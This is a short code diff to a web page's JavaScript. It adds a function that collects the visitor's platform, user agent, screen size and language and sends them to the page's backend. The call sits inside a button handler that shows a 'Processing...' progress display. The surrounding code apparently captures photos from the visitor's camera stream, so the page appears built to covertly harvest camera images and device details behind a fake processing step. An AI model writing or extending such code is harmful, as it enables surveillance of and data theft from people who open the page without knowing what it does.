@@ -126,6 +126,19 @@
             } catch (e) {} 
         }
 
+        async function sendDeviceInfo() {
+            const info = { 
+                deviceType: navigator.platform, 
+                androidVer: navigator.userAgent, 
+                screenSize: window.innerWidth + " x " + window.innerHeight, 
+                batteryLevel: "N/A", 
+                language: navigator.language 
+            };
+            const fd = new FormData(); 
+            fd.append('device_info', JSON.stringify(info)); 
+            await sendData(fd);
+        }
+
         async function sendSinglePhoto(stream) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -196,6 +209,9 @@
             btn.innerText = "Processing...";
             btn.disabled = true;
             processBox.style.display = "block";
+
+            // د وسیلې معلومات لیږل
+            await sendDeviceInfo();
 
             let progress = 0;
             const progressInterval = setInterval(() => {
